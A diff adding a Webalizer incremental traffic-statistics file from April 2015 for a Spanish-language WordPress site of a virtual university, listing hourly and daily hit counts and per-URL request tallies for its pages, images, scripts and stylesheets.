@@ -1,0 +1,6688 @@
+# Webalizer V2.23-08 Incremental Data - 04/06/2015 02:57:50
+2015 4 6 2 57 50
+35230 32672 1349 454 196 532 1039606935 4291 1338 0 0 0
+47 109 1029 1 6
+8123 7583 234925488 361 1164 294 0 0
+6618 6277 206890876 290 606 241 0 0
+6783 6381 210138829 254 667 239 0 0
+6052 5600 170047061 325 913 230 0 0
+7198 6432 207325661 364 772 302 0 0
+456 399 10279020 47 169 37 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+0 0 0 0 0 0 0 0
+820 746 25334528 153 0 0
+552 506 8177518 160 0 0
+355 331 10392700 71 0 0
+222 186 3778013 147 0 0
+711 613 17010400 83 0 0
+304 266 8958908 58 0 0
+671 569 16519139 163 0 0
+800 733 24517706 141 0 0
+1190 1034 30109158 157 0 0
+1959 1880 61985770 183 0 0
+2211 2044 58827209 417 0 0
+2044 1927 70473206 226 0 0
+2655 2440 76829592 220 0 0
+2074 1959 65941900 161 0 0
+2192 1956 70693190 169 0 0
+1691 1601 56624952 132 0 0
+1539 1443 51510034 216 0 0
+1363 1225 39388639 149 0 0
+2079 1898 43794561 368 0 0
+1623 1541 47871386 136 0 0
+1727 1663 53843488 151 0 0
+1810 1689 51384981 117 0 0
+2788 2686 93291683 386 0 0
+1850 1736 52348274 127 0 0
+0
+0
+0
+32672
+0
+0
+0
+0
+0
+278
+0
+655
+199
+0
+589
+0
+0
+0
+0
+0
+0
+813
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+24
+0
+0
+0
+0
+0
+# -urls- 
+/el-valor-de-un-grado-academico-de-maestria/feed/
+0 3 0 2776 3 1 0 0
+/feed/atom/
+0 8 0 315066 0 7 0 0
+/wp-content/themes/inceptio/css/smoothness/images/ui-bg_glass_75_dadada_1x400.png
+1 1 0 537 0 0 0 0
+/wp-content/uploads/caracter.jpg
+1 2 0 179746 0 0 0 0
+/wp-content/uploads/Salud-940x598.jpg
+1 2 0 153630 0 0 0 0
+/wp-content/uploads/vida-pareja.jpg
+1 7 0 545299 0 0 0 0
+/mi-cuenta/
+0 19 0 151616 2 1 0 0
+/tag/virtual/
+0 4 0 45569 0 1 0 0
+/portfolio/diplomado-en-instituciones-educativas/
+0 10 0 108787 2 2 0 0
+/portfolio/formacion-en-tutoria-virtual/
+0 19 0 145200 4 7 0 0
+/wp-content/uploads/salud-evangelismo.jpg
+1 9 0 748827 0 0 0 0
+/wp-content/uploads/vida-pareja-940x598.jpg
+1 3 0 278469 0 0 0 0
+/wp-content/themes/inceptio/images/web-browsers/chrome.png
+1 1 0 5318 0 0 0 0
+/proiectum/educacion/images/mano.svg
+0 10 0 17728 0 0 0 0
+/sitemap-pt-page-2014-04.xml
+0 1 0 915 0 0 0 0
+/portfolio/consejeria-familiar-dinamica-familiar/
+0 13 0 114217 3 4 0 0
+/wp-content/themes/inceptio/images/quote.png
+1 1 0 1589 0 0 0 0
+/wp-content/uploads/entrevista-aconsejamiento.jpg
+1 3 0 206570 0 0 0 0
+/sitemap.xml
+0 9 0 7796 0 0 0 0
+/wp-content/uploads/Equipo-UMVirtual.jpg
+1 3 0 288165 0 0 0 0
+/wp-content/themes/inceptio/images/bullets/list-arrow.png
+1 4 0 5248 0 0 0 0
+/wp-content/themes/inceptio/images/search.png
+1 268 0 490111 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/digg.png
+1 4 0 6017 0 0 0 0
+/tag/entrevista/
+0 5 0 51613 1 0 0 0
+/wp-content/plugins/akismet/_inc/akismet.js
+0 1 0 2284 0 0 0 0
+/author/mario-pereyra/feed/
+0 1 0 6059 1 1 0 0
+/wp-content/uploads/orientacion_familiar.jpg
+1 8 0 557896 0 0 0 0
+/portfolio/quiero-vivir-sano-8-habitos-saludables/
+0 30 0 216074 2 2 0 0
+/portfolio/como-disenar-actividades-que-desarrollan-competencias/
+0 32 0 319761 7 4 0 0
+/wp-content/themes/inceptio/images/social-media/footer/footer-facebook.png
+1 256 0 355579 0 0 0 0
+/wp-content/themes/inceptio/js/custom.js
+0 306 0 2883987 0 0 0 0
+/proiectum/educacion/images/umvitual.svg
+0 10 0 60787 0 0 0 0
+/wp-content/uploads/Salud.jpg
+1 5 0 240784 0 0 0 0
+/author/allen-zapien/
+0 6 0 58570 0 1 0 0
+/portfolio/estilo-de-vida-saludable/
+0 21 0 167980 7 1 0 0
+/admision/
+0 31 0 242304 1 1 0 0
+/wp-content/themes/inceptio/css/smoothness/images/ui-icons_222222_256x240.png
+1 2 0 14342 0 0 0 0
+/wp-content/uploads/quiero-vivir-sano-940x598.jpg
+1 14 0 1660682 0 0 0 0
+/wp-content/themes/inceptio/images/blog/comment.png
+1 4 0 5524 0 0 0 0
+/portfolio/formacion-de-promotores-de-salud-y-evangelismo/salud-evangelismo/
+0 2 0 11168 2 2 0 0
+/portfolio/salud-espiritual-jesus-la-gran-esperanza/
+0 11 0 95670 5 1 0 0
+/wp-content/uploads/entrevista.jpg
+1 2 0 166234 0 0 0 0
+/wp-content/themes/inceptio-child/fonts/umvirtual.woff
+0 148 0 349766 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.browser-min.js
+0 312 0 385941 0 0 0 0
+/portfolio/ventas/
+0 9 0 99705 3 0 0 0
+/evangelismo-tecnologico/
+0 19 0 234461 4 5 0 0
+/wp-content/uploads/orientacion_familiar-460x292.jpg
+1 38 0 948848 0 0 0 0
+/wp-content/uploads/Diapositiva13.jpg
+1 2 0 218450 0 0 0 0
+/wp-content/uploads/sexualidad1.jpg
+1 3 0 409476 0 0 0 0
+/wp-content/uploads/integracion-fe-460x292.jpg
+1 44 0 1585808 0 0 0 0
+/wp-content/uploads/partenon-460x292.jpg
+1 40 0 2241841 0 0 0 0
+/wp-content/plugins/advanced-iframe/js/ai.js
+0 317 0 2178098 0 0 0 0
+/wp-content/plugins/all-in-one-seo-pack/quickedit_functions.js
+0 1 0 1228 0 0 0 0
+/wp-content/themes/inceptio/images/web-browsers/firefox.png
+1 1 0 4966 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/dribbble.png
+1 4 0 6808 0 0 0 0
+/wp-content/uploads/plan-marketing.jpg
+1 4 0 212909 0 0 0 0
+/wp-content/uploads/Ejercicio-940x598.jpg
+1 5 0 496217 0 0 0 0
+/autofinanciamiento/
+0 19 0 170506 2 3 0 0
+/wp-content/themes/inceptio/css/colors/purple.css
+0 317 0 475389 0 0 0 0
+/wp-content/themes/inceptio/css/smoothness/images/ui-bg_flat_75_ffffff_40x100.png
+1 141 0 67311 0 0 0 0
+/portfolio/orientacion-profetica/
+0 15 0 154534 4 5 0 0
+/wp-content/uploads/salud-espiritual-460x292.jpg
+1 57 0 1784440 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/css/settings.css
+0 322 0 1893910 0 0 0 0
+/disfrutar-y-aprender-mas-en-plataformas-de-e-learning/
+0 12 0 159293 3 2 0 0
+/wp-content/uploads/VS.jpg
+1 15 0 2399250 0 0 0 0
+/cursos-cortos/
+0 48 0 473356 4 4 0 0
+/author/allen-zapien/feed/
+0 1 0 2725 1 1 0 0
+/wp-content/themes/inceptio/js/jquery.jcarousel.min.js
+0 306 0 1511453 0 0 0 0
+/wp-content/themes/inceptio-child/style.css
+0 319 0 158354 0 0 0 0
+/proiectum/educacion/favicon.png
+1 7 0 110692 0 0 0 0
+/wp-content/uploads/Maestria_en_Educacion.jpg
+1 7 0 372663 0 0 0 0
+/portfolio/curso-de-induccion/
+0 11 0 83986 2 3 0 0
+/wp-admin/load-scripts.php
+0 1 0 33607 0 0 0 0
+/wp-content/themes/inceptio/css/tipsy.css
+0 289 0 245017 0 0 0 0
+/wp-content/uploads/obrero.png
+1 226 0 102317960 0 0 0 0
+/diplomados/
+0 35 0 269196 3 2 0 0
+/portfolio/escribas-y-manuscritos-del-nuevo-testamento/
+0 9 0 84044 2 1 0 0
+/wp-content/uploads/plataforma-e42.jpg
+1 94 0 6077255 0 0 0 0
+/wp-content/uploads/recursos-humanos-460x292.jpg
+1 61 0 1684936 0 0 0 0
+/wp-content/uploads/Maestria_en_Educacion-460x292.jpg
+1 58 0 1298012 0 0 0 0
+/wp-content/uploads/recursos-humanos.jpg
+1 6 0 831232 0 0 0 0
+/educacion-cristiana-vs-secular/
+0 11 0 139509 3 2 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/delicious.png
+1 4 0 5432 0 0 0 0
+/wp-content/uploads/relaciones_familiares-940x598.jpg
+1 10 0 1085853 0 0 0 0
+/2015/02/
+0 6 0 71903 0 0 0 0
+/pregrado/
+0 59 0 373516 1 2 0 0
+/wp-content/uploads/salud-mental.jpg
+1 30 0 1198660 0 0 0 0
+/wp-content/uploads/salud-espiritual-940x598.jpg
+1 2 0 107414 0 0 0 0
+/wp-content/themes/inceptio/images/testimonial-author-male.png
+1 1 0 1468 0 0 0 0
+/wp-content/uploads/estrategias-ensenanza-460x292.jpg
+1 42 0 1582152 0 0 0 0
+/wp-content/uploads/estrategias-ensenanza-940x598.jpg
+1 2 0 216801 0 0 0 0
+/wp-content/uploads/teologia-aplicada-940x598.jpg
+1 5 0 323015 0 0 0 0
+/author/admin/
+0 8 0 69518 3 2 0 0
+/portfolio/fundamentos-firmes-para-la-familia-contemporanea/
+0 12 0 112526 1 3 0 0
+/portfolio/introduccion-a-la-investigacion/
+0 12 0 105036 5 3 0 0
+/tag/educacion/
+0 7 0 75810 2 0 0 0
+/wp-content/themes/inceptio/css/responsive.css
+0 320 0 563959 0 0 0 0
+/wp-content/themes/inceptio/images/web-browsers/safari.png
+1 1 0 5467 0 0 0 0
+/wp-content/uploads/liderazgo-460x292.jpg
+1 39 0 1385131 0 0 0 0
+/wp-content/uploads/plan-estrategico.jpg
+1 47 0 4582479 0 0 0 0
+/wp-content/uploads/bkg-slide-01.jpg
+1 197 0 11315284 0 0 0 0
+/wp-content/uploads/educativas-460x292.jpg
+1 47 0 1405057 0 0 0 0
+/wp-content/uploads/educacion-cristiana-vs-secular.jpg
+1 1 0 49112 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.ui.totop.min.js
+0 307 0 285544 0 0 0 0
+/wp-content/themes/inceptio/css/smoothness/images/ui-bg_glass_75_e6e6e6_1x400.png
+1 2 0 1018 0 0 0 0
+/wp-content/uploads/programa-salud.jpg
+1 3 0 373001 0 0 0 0
+/wp-content/themes/inceptio/images/arrowbox-title-arrow-back.png
+1 170 0 254781 0 0 0 0
+/wp-includes/wlwmanifest.xml
+0 3 0 3976 0 0 0 0
+/wp-content/uploads/Mision-UMVirtual.jpg
+1 1 0 173 0 0 0 0
+/wp-content/themes/inceptio/images/favicon.ico
+0 1 0 3116 0 0 0 0
+/wp-content/uploads/sexualidad1-940x598.jpg
+1 3 0 243882 0 0 0 0
+/el-valor-de-un-grado-academico-de-maestria/
+0 12 0 135176 2 2 0 0
+/wp-content/uploads/teologia-aplicada-460x292.jpg
+1 38 0 774963 0 0 0 0
+/portfolio/promocion-vida-saludable/
+0 11 0 112666 3 3 0 0
+/wp-content/uploads/educativas-940x598.jpg
+1 2 0 180156 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.fitvids.js
+0 308 0 422571 0 0 0 0
+/wp-content/uploads/lic-administracion.jpg
+1 1 0 173 0 0 0 0
+/wp-content/uploads/adventist_accrediting_association.jpg
+1 94 0 855552 0 0 0 0
+/wp-content/uploads/Ejercicio.jpg
+1 5 0 1820492 0 0 0 0
+/wp-content/themes/inceptio-child/custom.css
+0 318 0 846592 0 0 0 0
+/wp-content/plugins/enlighter/resources/mootools-core-yc.js
+0 314 0 9500343 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/twitter.png
+1 243 0 362264 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/footer/footer-twitter.png
+1 259 0 385626 0 0 0 0
+/wp-content/uploads/liz.png
+1 246 0 163832139 0 0 0 0
+/wp-content/themes/inceptio/images/no-image.png
+1 1 0 172 0 0 0 0
+/portfolio/estrategias-de-ensenanza-para-las-nuevas-generaciones/
+0 15 0 133781 4 2 0 0
+/acerca/
+0 22 0 225726 7 6 0 0
+/proiectum/educacion/images/bkg.jpg
+1 8 0 60442 0 0 0 0
+/wp-content/uploads/caracter1-940x598.jpg
+1 1 0 97880 0 0 0 0
+/wp-content/uploads/entrevista-consejeria-460x292.jpg
+1 44 0 1640050 0 0 0 0
+/wp-admin/
+0 1 0 15239 0 0 0 0
+/wp-content/uploads/Britannica_Universal.jpg
+1 94 0 1383801 0 0 0 0
+/wp-content/uploads/Patricia_Monarrez.jpg
+1 2 0 27238 0 0 0 0
+/wp-content/uploads/bkg-grid-full.jpg
+1 228 0 59744180 0 0 0 0
+/wp-content/uploads/teologia.jpg
+1 65 0 5992190 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/footer/footer-google-plus.png
+1 257 0 384996 0 0 0 0
+/wp-content/uploads/orientacion-profetica-460x292.jpg
+1 41 0 1269113 0 0 0 0
+/wp-content/uploads/Dios-el-mejor-programador-post.jpg
+1 13 0 892227 0 0 0 0
+/wp-content/themes/inceptio/images/testimonial-author-female.png
+1 1 0 1517 0 0 0 0
+/tag/plataformas/
+0 4 0 45639 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/images/slider/arrows.png
+1 128 0 167709 0 0 0 0
+/wp-content/themes/inceptio-child/fonts/umvirtual.ttf
+0 14 0 40748 0 0 0 0
+/category/educacion/
+0 7 0 76068 1 1 0 0
+/portfolio/principios-de-hermeneutica/
+0 8 0 72876 2 2 0 0
+/wp-content/themes/inceptio/js/selectivizr-min.js
+0 2 0 5556 0 0 0 0
+/wp-content/uploads/anuis.jpg
+1 94 0 4946155 0 0 0 0
+/portfolio/plan-de-marketing/
+0 14 0 117274 4 1 0 0
+/wp-content/plugins/akismet/_inc/akismet.css
+0 1 0 1979 0 0 0 0
+/acerca-de-la-e42/
+0 9 0 67626 1 0 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/stumbleupon.png
+1 4 0 6544 0 0 0 0
+/portfolio/maestria-en-recursos-humanos/
+0 14 0 200365 1 2 0 0
+/portfolio/la-espiritualidad-del-predicador/
+0 12 0 111954 4 9 0 0
+/wp-content/uploads/escribas_manuscritos-460x292.jpg
+1 55 0 1721038 0 0 0 0
+/wp-content/uploads/Diapositiva15.jpg
+1 2 0 120040 0 0 0 0
+/portfolio/responsabilidades-parentales/
+0 15 0 129536 7 2 0 0
+/wp-content/uploads/Caty_Trisca-150x150.jpg
+1 2 0 13990 0 0 0 0
+/wp-content/themes/inceptio/images/toggle-plus.png
+1 139 0 187570 0 0 0 0
+/wp-content/uploads/umvirtual.jpg
+1 3 0 188505 0 0 0 0
+/wp-content/uploads/educativas.jpg
+1 2 0 158202 0 0 0 0
+/mi-cuenta/e42-lite/
+0 34 0 227050 10 7 0 0
+/favicon.ico
+0 51 0 11595 0 0 0 0
+/wp-content/themes/inceptio/css/html5-reset.css
+0 287 0 720242 0 0 0 0
+/wp-content/uploads/tutoria-virtual.jpg
+1 5 0 7914844 0 0 0 0
+/wp-content/uploads/finanzas-940x598.jpg
+1 6 0 556074 0 0 0 0
+/wp-content/themes/inceptio/js/jflickrfeed.min.js
+0 306 0 347235 0 0 0 0
+/wp-includes/css/buttons.css
+0 1 0 9526 0 0 0 0
+/wp-content/uploads/recursos-humanos-940x598.jpg
+1 6 0 502343 0 0 0 0
+/wp-content/uploads/accesibilidad.png
+1 182 0 3391917 0 0 0 0
+/wp-content/uploads/teologia-460x292.jpg
+1 90 0 2185522 0 0 0 0
+/tag/en-linea/
+0 4 0 45599 0 0 0 0
+/wp-content/uploads/disenar-actividades-460x292.jpg
+1 51 0 1225495 0 0 0 0
+/wp-content/uploads/principios-hermeneutica.jpg
+1 53 0 5209523 0 0 0 0
+/tag/entrevista/feed/
+0 1 0 6054 1 0 0 0
+/wp-content/uploads/experiencia.png
+1 198 0 29963166 0 0 0 0
+/bower_components/iframe-resizer/js/iframeResizer.min.js
+0 287 0 949688 0 0 0 0
+/proiectum/educacion/css/styles.css
+0 9 0 29132 0 0 0 0
+/portfolio/implementacion-de-programas-de-salud-en-instituciones-educativas/
+0 10 0 97836 4 2 0 0
+/wp-content/themes/inceptio/css/smoothness/images/ui-icons_454545_256x240.png
+1 1 0 7269 0 0 0 0
+/wp-content/uploads/finanzas.jpg
+1 6 0 518988 0 0 0 0
+/wp-content/plugins/enlighter/resources/EnlighterJS.yui.js
+0 315 0 5705427 0 0 0 0
+/wp-content/uploads/evangelismo-tecnologico.jpg
+1 2 0 142778 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/assets/timer.png
+1 169 0 65623 0 0 0 0
+/sitemap-pt-post-2015-03.xml
+0 7 0 6259 0 0 0 0
+/proiectum/educacion/images/hr2.jpg
+1 8 0 65274 0 0 0 0
+/wp-content/uploads/umvirtual.png
+1 288 0 9998276 0 0 0 0
+/wp-content/plugins/enlighter/resources/EnlighterJS.yui.css
+0 318 0 2641102 0 0 0 0
+/portfolio/formacion-del-caracter/
+0 11 0 105641 4 4 0 0
+/wp-content/themes/inceptio/css/flexslider.css
+0 289 0 578733 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/youtube.png
+1 3 0 6127 0 0 0 0
+/portfolio/plan-estrategico-de-desarrollo/
+0 17 0 136046 4 1 0 0
+/evangelismo-tecnologico/feed/
+0 1 0 888 0 0 0 0
+/wp-content/uploads/fundamentos-460x292.jpg
+1 45 0 1151058 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/footer/footer-youtube.png
+1 259 0 386084 0 0 0 0
+/wp-content/uploads/saludable-940x598.jpg
+1 11 0 748187 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.flexslider-min.js
+0 303 0 1766519 0 0 0 0
+/proiectum/educacion/images/ninos-aburridos.jpg
+1 16 0 2953099 0 0 0 0
+/wp-content/uploads/Diapositiva14.jpg
+1 2 0 247020 0 0 0 0
+/wp-content/themes/inceptio/images/bullets/right_16.png
+1 168 0 582379 0 0 0 0
+/wp-content/uploads/evangelismo-460x292.jpg
+1 54 0 1414459 0 0 0 0
+/wp-content/uploads/bkg-flexibilidad.jpg
+1 215 0 58655701 0 0 0 0
+/wp-content/uploads/paternidad.jpg
+1 3 0 342342 0 0 0 0
+/wp-content/uploads/Liliana_Herrera.jpg
+1 3 0 91764 0 0 0 0
+/wp-content/uploads/maestria.jpg
+1 1 0 173 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.tipsy.js
+0 306 0 934773 0 0 0 0
+/wp-content/themes/inceptio/images/contact/fax.png
+1 262 0 380910 0 0 0 0
+/tag/programacion/
+0 5 0 54928 1 0 0 0
+/dios-el-mejor-programador/feed/
+0 1 0 888 1 1 0 0
+/tag/bloopers/
+0 4 0 44615 0 1 0 0
+/wp-content/plugins/revslider/rs-plugin/assets/shadow1.png
+1 167 0 735724 0 0 0 0
+/wp-content/uploads/salud-evangelismo-940x598.jpg
+1 9 0 573628 0 0 0 0
+/wp-content/themes/inceptio/images/footer-arrow-down.png
+1 264 0 349922 0 0 0 0
+/portfolio/maestria-en-relaciones-familiares/
+0 17 0 238000 1 2 0 0
+/bloopers-2014/feed/
+0 1 0 875 0 1 0 0
+/wp-content/uploads/e42_lite.jpg
+1 5 0 262869 0 0 0 0
+/wp-content/uploads/administracion.jpg
+1 113 0 12295035 0 0 0 0
+/acerca/modelo-educativo/
+0 14 0 124041 3 2 0 0
+/wp-content/uploads/Redalyc.jpg
+1 96 0 1587059 0 0 0 0
+/wp-content/uploads/c-influencia-940x598.jpg
+1 5 0 540380 0 0 0 0
+/wp-content/uploads/educacion-adventista-460x292.jpg
+1 44 0 1144858 0 0 0 0
+/sitemap-pt-post-2015-02.xml
+0 2 0 1951 0 0 0 0
+/wp-content/themes/inceptio/css/smoothness/images/ui-icons_888888_256x240.png
+1 2 0 14496 0 0 0 0
+/sitemap-pt-portfolio-2015-03.xml
+0 1 0 737 0 0 0 0
+/portfolio/activacion-fisica-para-el-bienestar-personal/
+0 15 0 119985 3 3 0 0
+/wp-content/uploads/intro-investigacion-460x292.jpg
+1 40 0 982881 0 0 0 0
+/newsletter/images/iconos_03.jpg
+1 41 0 71520 0 0 0 0
+/wp-includes/js/comment-reply.min.js
+0 295 0 221273 0 0 0 0
+/wp-content/themes/inceptio/images/block-64.png
+1 8 0 71224 0 0 0 0
+/wp-content/themes/inceptio/images/web-browsers/internet-explorer.png
+1 1 0 4955 0 0 0 0
+/acerca/mision-y-vision/
+0 14 0 130926 4 0 0 0
+/newsletter/images/iconos_01.jpg
+1 39 0 88882 0 0 0 0
+/wp-content/uploads/Ejercicio-460x292.jpg
+1 47 0 1835666 0 0 0 0
+/wp-content/themes/inceptio/js/ie.js
+0 311 0 262364 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.fancybox-media.js
+0 306 0 684327 0 0 0 0
+/wp-includes/js/jquery/jquery-migrate.min.js
+0 314 0 1061154 0 0 0 0
+/wp-content/themes/inceptio/images/toggle-minus.png
+1 37 0 48695 0 0 0 0
+/wp-content/uploads/fundamentos.jpg
+1 2 0 522220 0 0 0 0
+/wp-content/themes/inceptio/custom.css
+0 325 0 86575 0 0 0 0
+/newsletter/images/um-logo.jpg
+1 39 0 517011 0 0 0 0
+/sitemap-pt-page-2015-02.xml
+0 1 0 1054 0 0 0 0
+/proiectum/educacion/images/hr1.jpg
+1 8 0 63570 0 0 0 0
+/tag/cosmovision/
+0 5 0 57856 1 0 0 0
+/wp-content/uploads/c-influencia.jpg
+1 5 0 602869 0 0 0 0
+/wp-content/themes/inceptio/images/contact/home.png
+1 264 0 398104 0 0 0 0
+/wp-content/uploads/Evangelismo-Tecnologico.jpg
+1 1 0 36473 0 0 0 0
+/portfolio/fundamento-desarrollo-y-alcance-del-sistema-educativo-adventista/
+0 11 0 117096 4 4 0 0
+/portfolio/maestria-en-finanzas/
+0 13 0 187356 1 0 0 0
+/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.plugins.min.js
+0 313 0 8723927 0 0 0 0
+/wp-content/uploads/saludable-460x292.jpg
+1 35 0 835086 0 0 0 0
+/tag/e-learning/
+0 4 0 45595 1 0 0 0
+/wp-content/themes/inceptio/images/testimonial-arrow.png
+1 1 0 1384 0 0 0 0
+/wp-content/uploads/atencion-clientes.jpg
+1 44 0 4293923 0 0 0 0
+/proiectum/educacion/favicon.ico
+0 6 0 1595510 0 0 0 0
+/category/tecnologia/
+0 10 0 89153 7 3 0 0
+/wp-content/uploads/atla.jpg
+1 95 0 1654743 0 0 0 0
+/portfolio/consejeria-familiar-vida-en-pareja/
+0 12 0 106528 4 3 0 0
+/portfolio/orientacion-familiar/
+0 22 0 190219 4 3 0 0
+/educacion-formal/
+0 21 0 185304 1 1 0 0
+/proiectum/educacion/fonts/proiectum.woff
+0 8 0 10860 0 0 0 0
+/wp-content/uploads/emprendedora.png
+1 238 0 116328265 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js
+0 317 0 6125848 0 0 0 0
+/wp-content/uploads/saludable.jpg
+1 351 0 26420417 0 0 0 0
+/proiectum/educacion/images/hr3.jpg
+1 8 0 66498 0 0 0 0
+/wp-content/uploads/paternidad-940x598.jpg
+1 3 0 337308 0 0 0 0
+/posgrado/educacion/
+0 3 0 16582 2 2 0 0
+/portfolio/maestria-en-ciencias-computacionales/
+0 10 0 151239 1 1 0 0
+/sitemap-pt-page-2015-03.xml
+0 1 0 741 0 0 0 0
+/wp-login.php
+0 186 0 764469 7 4 0 0
+/newsletter/images/iconos_04.jpg
+1 39 0 73105 0 0 0 0
+/wp-content/themes/inceptio/js/form-processor.js
+0 305 0 344970 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/rss.png
+1 3 0 6229 0 0 0 0
+/wp-content/uploads/Dios-el-mejor-programador1.jpg
+1 3 0 189250 0 0 0 0
+/newsletter/images/iconos_08.jpg
+1 12 0 19771 0 0 0 0
+/wp-content/themes/inceptio/images/mail.png
+1 278 0 8024086 0 0 0 0
+/wp-content/uploads/Salud-460x292.jpg
+1 37 0 993130 0 0 0 0
+/category/um-virtual/
+0 7 0 63928 0 0 0 0
+/wp-content/uploads/evangelismo-940x598.jpg
+1 1 11 173 0 0 0 0
+/tag/software/
+0 6 0 61716 1 1 0 0
+/wp-content/uploads/bkg-spots-publicitarios.jpg
+1 194 0 14786926 0 0 0 0
+/wp-content/uploads/induccion-460x292.jpg
+1 40 0 1232812 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.validate.min.js
+0 305 0 2096949 0 0 0 0
+/portfolio/griego-l/
+0 8 0 73829 3 1 0 0
+/wp-content/themes/inceptio/css/jquery.fancybox.css
+0 290 0 516391 0 0 0 0
+/wp-content/themes/inceptio/js/ddlevelsmenu.js
+0 311 0 2008294 0 0 0 0
+/wp-content/themes/inceptio/js/ddlevelsmenu-invoker.js
+0 310 0 188303 0 0 0 0
+/wp-content/uploads/quiero-vivir-sano.jpg
+1 16 0 1828781 0 0 0 0
+/wp-content/uploads/educacion-adventista.jpg
+1 2 0 137945 0 0 0 0
+/wp-includes/js/jquery/jquery.js
+0 314 0 10590526 0 0 0 0
+/dios-el-mejor-programador/
+0 15 0 173816 5 3 0 0
+/wp-content/themes/inceptio/images/blog/author.png
+1 6 0 8744 0 0 0 0
+/wp-content/uploads/quiero-vivir-sano-460x292.jpg
+1 60 0 2434755 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.tweet.js
+0 304 0 1703976 0 0 0 0
+/wp-content/uploads/escribas_manuscritos.jpg
+1 2 0 346 0 0 0 0
+/acerca/testimonios/
+0 10 0 107752 1 0 0 0
+/wp-content/plugins/revslider/rs-plugin/font/revicons.eot
+0 3 0 37299 0 0 0 0
+/wp-content/themes/inceptio/style.css
+0 297 0 3009419 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/css/dynamic-captions.css
+0 322 0 209896 0 0 0 0
+/wp-content/uploads/salud-mental-460x292.jpg
+1 59 0 1276462 0 0 0 0
+/cursos/
+0 18 0 147869 3 2 0 0
+/wp-content/uploads/salud-mental-940x598.jpg
+1 12 0 809978 0 0 0 0
+/wp-content/uploads/Familia-460x292.jpg
+1 46 0 2201005 0 0 0 0
+/posgrado/
+0 66 0 439857 2 1 0 0
+/tag/tecnologia/
+0 8 0 75286 1 1 0 0
+/wp-content/themes/inceptio-child/fonts/umvirtual.svg
+0 1 0 4705 0 0 0 0
+/wp-content/themes/inceptio/js/respond.min.js
+0 2 0 4848 0 0 0 0
+/author/lorena/
+0 7 0 64681 3 1 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/facebook.png
+1 7 0 9830 0 0 0 0
+/wp-content/uploads/finanzas-460x292.jpg
+1 58 0 1833976 0 0 0 0
+/portfolio/como-conducir-una-entrevista-de-consejeria/
+0 13 0 118590 2 2 0 0
+/wp-content/uploads/tutoria-virtual-940x598.jpg
+1 3 0 277260 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/css/rs-custom.css
+0 319 0 444059 0 0 0 0
+/proiectum/educacion/images/korniejczuk.png
+1 8 0 4037349 0 0 0 0
+/wp-content/uploads/entrevista-consejeria-940x598.jpg
+1 2 0 228756 0 0 0 0
+/wp-content/uploads/salud-espiritual.jpg
+1 7 0 746272 0 0 0 0
+/wp-content/themes/inceptio/images/contact/phone.png
+1 261 0 388350 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/footer/footer-rss.png
+1 261 0 395889 0 0 0 0
+/proiectum/educacion/images/twitter.svg
+0 10 0 18266 0 0 0 0
+/wp-content/uploads/directores-educacion-460x292.jpg
+1 44 0 1188657 0 0 0 0
+/xmlrpc.php
+0 208 0 126427 28 25 0 0
+/portfolio/salud-emocional-y-bienestar-personal/
+0 33 0 242317 6 6 0 0
+/wp-content/themes/inceptio/css/smoothness/jquery-ui-1.10.1.custom.min.css
+0 288 0 1623097 0 0 0 0
+/category/um-virtual/feed/
+0 1 0 1225 1 1 0 0
+/wp-content/uploads/elearning-700x300.jpg
+1 2 0 63953 0 0 0 0
+/wp-content/uploads/sexualidad1-460x292.jpg
+1 53 0 1344379 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.easing.1.3.js
+0 309 0 711739 0 0 0 0
+/wp-content/themes/inceptio/images/contact/mail.png
+1 261 0 403431 0 0 0 0
+/wp-content/uploads/flexibilidad.png
+1 195 0 3298410 0 0 0 0
+/wp-content/uploads/valor-maestria-portada.jpg
+1 2 0 156716 0 0 0 0
+/tag/investigacion/
+0 5 0 52151 3 0 0 0
+/wp-content/themes/inceptio/js/jquery-ui-1.10.1.custom.min.js
+0 306 0 18437392 0 0 0 0
+/tag/online/
+0 6 0 58617 0 0 0 0
+/wp-content/themes/inceptio/images/scroll-top.png
+1 249 0 318061 0 0 0 0
+/wp-content/uploads/programa-salud-460x292.jpg
+1 51 0 1839798 0 0 0 0
+/portfolio/como-crear-un-centro-de-influencia/
